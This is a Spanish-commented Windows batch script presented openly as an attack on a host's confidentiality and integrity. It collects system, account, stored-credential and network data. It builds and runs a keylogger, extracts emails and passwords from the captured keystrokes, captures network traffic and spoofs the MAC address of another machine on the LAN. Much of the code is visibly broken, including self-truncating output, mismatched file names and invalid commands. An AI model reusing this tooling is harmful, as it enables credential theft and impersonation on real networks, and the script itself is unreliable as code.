:: Script que extrae la información del host local  usando comandos de windows para atacar la CIA (Confidencialidad, Integridad y Disponibilidad)
 
:: Crea archivo de salida.txt

.> salida.txt
...> salida.txt
.....> salida.txt
.......> salida.txt
.........> salida.txt
...........> salida.txt
.............> salida.txt

:: Obtiene nombre de host y lo almacena en una variable de entorno
:: Dicha variable sera utilizada para renombrar el archivo una vez finalice la ejecución del script

SETLOCAL
SET myHostName = HOSTNAME

:: ####################### Vulnerando Confidencialidad #######################
Echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt


    HOSTNAME >> Salida.txt

    .> salida.txt
    .> salida.txt

    SYSTEMINFO >> salida.txt

    .> salida.txt
    .> salida.txt

    WMIC OS GET Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
    WMIC CPU GET Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
    WMIC MEMORYCHIP GET BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
    WMIC COMPUTERSYSTEM GET Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt

    .> salida.txt
    .> salida.txt



    NBTSTAT -n >> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACION DE LOS USUARIOS **************************** >> salida.txt

    .> salida.txt
    .> salida.txt

    WHOAMI /ALL >> salida.txt

    .> salida.txt
    .> salida.txt

    NET LOCALGROUP Administrators >> salida.txt

    .> salida.txt
    .> salida.txt

    CMDKEY /LIST >> salida.txt

    .> salida.txt
    .> salida.txt

    NET ACCOUNTS >> salida.txt

    .> salida.txt
    .> salida.txt

    MSINFO32 >> salida.txt

    .> salida.txt
    .> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACION DE LA RED **************************** >> salida.txt

    .> salida.txt
    .> salida.txt

    ipconfig /all >> salida.txt

    .> salida.txt
    .> salida.txt


    NETSTAT -ano >> salida.txt

    .> salida.txt
    .> salida.txt

    NBTSTAT -n >> salida.txt

    .> salida.txt
    .> salida.txt


    NETSH interface ip show config >> salida.txt

    .> salida.txt
    .> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACION DE LOS PROCESOS ****************************
    .> salida.txt
    .> salida.txt

    TASKLIST >> salida.txt

    .> salida.txt
    .> salida.txt

    DRIVERQUERY >> salida.txt

    .> salida.txt
    .> salida.txt

    netsh helper >> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACION DE LOS SERVICIOS ****************************

    TASKLIST >> salida.

    .> salida.txt
    .> salida.txt

    DRIVERQUERY >> salida.txt

    .> salida.txt
    .> salida.txt

    netsh helper >> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACIÓN DE PULSACIONES DE TECLADO **************************** >> salida.txt

    .> salida.txt
    .> salida.txt
    :: Compilar archivo de Cs que detecta pulsaciones de teclado anormales
    csc.exe /out:KeyLogger.exe Keylogger.cs /reference:System.Windows.Forms.dll /reference:System.Drawing.dll >> salida.txt
    KeyLogger.exe >> Pulsations.txt
    KeyLogger.exe >> salida.txt

echo ************************************************************************************* >> salida.txt

echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt

    .> salida.txt
    .> salida.txt

    MKDIR keyloggerLogs

    MOVE Pulsaciones.txt keyloggerLogs

    NETSH trace start capture=yes

    NETSH trace stop

    :: Obtiene las solicitudes http capturadas  en una variable local

    SETLOCAL
    SET myTrace = NETSH trace show trace

    :: busca en el archivo Puñsaciones.txt cadenas de terxto relacionadas a correos electronicos y las almacena en un archivo llamado mails.txt mediante Regex 

    FINDSTR /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" Pulsaciones.txt >> keyloggerLogs\mails.txt

    :: Ejecuta el archivo ExtractAfterEmail.vbs que extrae strings relacionados a contraseñas

    wscript ExtractAfterEmail.vbs

    :: Crea archivo txt con las solicitudes http capturadas 

    %myTrace% >> keyloggerLogs\httpRequests.txt
Echo ************************************************************************************* >> salida.txt
:: ################### COMANDOS QUE VULNERAN LA INTEGRIDAD ####################

Echo **************************** SPOOFING **************************** >> salida.txt
    GETMAC >> salida.txt

    .> salida.txt
    .> salida.txt
    ARP -a >> salida.txt


    SETLOCAL
    SET PullHost = ARP -a
    SETLOCAL ENABLEDELAYEDEXPANSION
    set "IP="
    set "MASK="
    set "isWirelessAdapter=0"
    set "NETWORK="
    set "poolHost="

    Echo **************************** Calcula la Ip host y la mascara para obtener  la ip de la red ***************************

        :: Ejecutar ipconfig y almacenar la salida en una variable
        FOR /F "tokens=*" %%A IN ('ipconfig /all') DO (
            SET "InfNetwork=%%A"
            CALL :ProcessLine
        )

        :: Calcular la dirección de red
        CALL :CalculateNetwork %IP% %MASK%

        :: Mostrar los resultados
        ECHO Dirección IP: %IP% >> salida.txt
        ECHO Máscara de subred: %MASK% >> salida.txt
        ECHO Dirección de red: %NETWORK% >> salida.txt

        ENDLOCAL
        EXIT /B

        :ProcessLine
            :: Identificar el adaptador de LAN inalámbrica
            IF "!InfNetwork!" NEQ "" (
                ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
                    SET "isWirelessAdapter=1"
                )
                :: Extraer la dirección IP si es un adaptador de LAN inalámbrica
                IF "!isWirelessAdapter!" EQU "1" (
                    ECHO !InfNetwork! | findstr /R /C:"Dirección.*IPv4" >nul && (
                        FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "IP=%%B"
                        SET "IP=!IP: =!"
                    )
                    :: Extraer la máscara de subred si es un adaptador de LAN inalámbrica
                    ECHO !InfNetwork! | findstr /R /C:"Máscara.*subred" >nul && (
                        FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "MASK=%%B"
                        SET "MASK=!MASK: =!"
                    )
                )
                :: Resetear la bandera si se encuentra otro adaptador
                ECHO !InfNetwork! | findstr /R /C:"Adaptador.*Ethernet" >nul && (
                    SET "isWirelessAdapter=0"
                )
            )
        EXIT /B

        :CalculateNetwork
            setlocal
            set "IP=%1"
            set "MASK=%2"

            :: Convertir IP y máscara a binario
            CALL :IpToBinary %IP% IP_BIN
            CALL :IpToBinary %MASK% MASK_BIN

            :: Calcular la dirección de red en binario
            set "NETWORK_BIN="
            for /L %%i in (0,1,31) do (
                set /A "bit=!IP_BIN:~%%i,1! & !MASK_BIN:~%%i,1!"
                set "NETWORK_BIN=!NETWORK_BIN!!bit!"
            )

            :: Convertir la dirección de red binaria a decimal
            CALL :BinaryToIp %NETWORK_BIN% NETWORK

            endlocal & set "NETWORK=%NETWORK%"
        exit /b

        :IpToBinary
            setlocal
            set "IP=%1"
            set "IP_BIN="
            for %%i in (%IP:.= %) do (
                set /A "octet=%%i"
                set "bin=00000000!octet:~0,8!"
                set "IP_BIN=!IP_BIN!!bin:~-8!"
            )
            endlocal & set "%2=%IP_BIN%"
        exit /b

        :BinaryToIp
            setlocal
            set "BIN=%1"
            set "IP="
            for /L %%i in (0,8,24) do (
                set /A "octet=0b!BIN:~%%i,8!"
                set "IP=!IP!!octet!."
            )
            set "IP=%IP:~0,-1%"
            endlocal & set "%2=%IP%"
        exit /b

    Echo ************************************************************************************* >> salida.txt

    :: Recorre línea por línea la información de la variable PullHost para obtener la dirección IP y la dirección MAC de otro host perteneciente a la red "NETWORK" con la máscara "MASK"
    
    :: Función general que recorre la información de la variable PullHost para obtener la variable salida

    :GetPoolHostNetwork
        
        setlocal enabledelayedexpansion
        :: Función para obtener la dirección IP y la dirección MAC de otro host
        :ObtenerIPsYMACs
            set "index=0"
            FOR /F "tokens=1,2,3 delims= " %%A IN ('%PullHost%') DO (
                IF "%%A" NEQ "Interfaz:" (
                    IF "%%B" NEQ "" (
                        set "poolHost[!index!]=%%A"
                        set "poolMAC[!index!]=%%B"
                        set /A index+=1
                    )
                )
            )
            exit /b

        :: Función para crear un arreglo general de IPs y MACs
        :CrearArregloGeneral
            set "index=0"
            for /L %%i in (0,1,%index%) do (
                set "ip=!poolHost[%%i]!"
                set "mac=!poolMAC[%%i]!"
                set "arregloGeneral[!ip!]=!mac!"
            )
            exit /b

        :: Función para validar las IPs frente a la red y la máscara
        :ValidarIPs
            set "index=0"
            for /L %%i in (0,1,%index%) do (
                set "ip=!poolHost[%%i]!"
                call :CalculateNetwork !ip! %MASK%
                if "!NETWORK!" EQU "%NETWORK%" (
                    set "salida[!index!]=!ip! !poolMAC[%%i]!"
                    set /A index+=1
                )
            )
            exit /b

        :: Función para calcular la dirección de red
        :CalculateNetwork
            setlocal
            set "IP=%1"
            set "MASK=%2"

            :: Convertir IP y máscara a binario
            CALL :IpToBinary %IP% IP_BIN
            CALL :IpToBinary %MASK% MASK_BIN

            :: Calcular la dirección de red en binario
            set "NETWORK_BIN="
            for /L %%i in (0,1,31) do (
                set /A "bit=!IP_BIN:~%%i,1! & !MASK_BIN:~%%i,1!"
                set "NETWORK_BIN=!NETWORK_BIN!!bit!"
            )

            :: Convertir la dirección de red binaria a decimal
            CALL :BinaryToIp %NETWORK_BIN% NETWORK

            endlocal & set "NETWORK=%NETWORK%"
            exit /b

        :: Función para convertir IP a binario
        :IpToBinary
            setlocal
            set "IP=%1"
            set "IP_BIN="
            for %%i in (%IP:.= %) do (
                set /A "octet=%%i"
                set "bin=00000000!octet:~0,8!"
                set "IP_BIN=!IP_BIN!!bin:~-8!"
            )
            endlocal & set "%2=%IP_BIN%"
            exit /b

        :: Función para convertir binario a IP
        :BinaryToIp
            setlocal
            set "BIN=%1"
            set "IP="
            for /L %%i in (0,8,24) do (
                set /A "octet=0b!BIN:~%%i,8!"
                set "IP=!IP!!octet!."
            )
            set "IP=%IP:~0,-1%"
            endlocal & set "%2=%IP%"
            exit /b

        :: Llamar a las funciones
        call :ObtenerIPsYMACs
        call :CrearArregloGeneral
        call :ValidarIPs

        :: Mostrar los resultados
        for /L %%i in (0,1,%index%) do (
            echo Lista de ips y Macs pertenecientes a la red: >> salida.txt
            echo !salida[%%i]! >> salida.txt
        )

    exit /b

    :SpoofingmAC
        setlocal enabledelayedexpansion

        :: Función para obtener la dirección IP del propio dispositivo
        :GetOwnIP
            for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /c:"Dirección IPv4"') do (
                for /f "tokens=1 delims= " %%j in ("%%i") do (
                    set "ownIP=%%j"
                )
            )
            exit /b

        :: Función para cambiar la dirección MAC de la interfaz de red
        :CambiarMAC
            set "interface=Ethernet"
            set "newMAC=%1"
            netsh interface set interface name="%interface%" newmac="%newMAC%"
            exit /b

        :: Función para hacer spoofing de la MAC
        :SpoofingMAC
            call :GetOwnIP

            :: Recorrer el arreglo salida para encontrar una IP diferente a la propia
            set "found=0"
            for /L %%i in (0,1,%index%) do (
                set "elemento=!salida[%%i]!"
                for /F "tokens=1,2 delims= " %%A in ("!elemento!") do (
                    if "%%A" NEQ "!ownIP!" (
                        set "macParaSpoofing=%%B"
                        set "found=1"
                        goto :SpoofingMAC_Found
                    )
                )
            )

        :SpoofingMAC_Found
            if "!found!" EQU "1" (
                :: Llamar a la función CambiarMAC con la nueva dirección MAC
                call :CambiarMAC %macParaSpoofing%
            ) else (
                echo No se encontró una IP diferente a la propia en el arreglo salida.
            )
            exit /b

        :: Llamar a la función SpoofingMAC
        call :SpoofingMAC
        exit /b

Echo ************************************************************************************* >> salida.txt


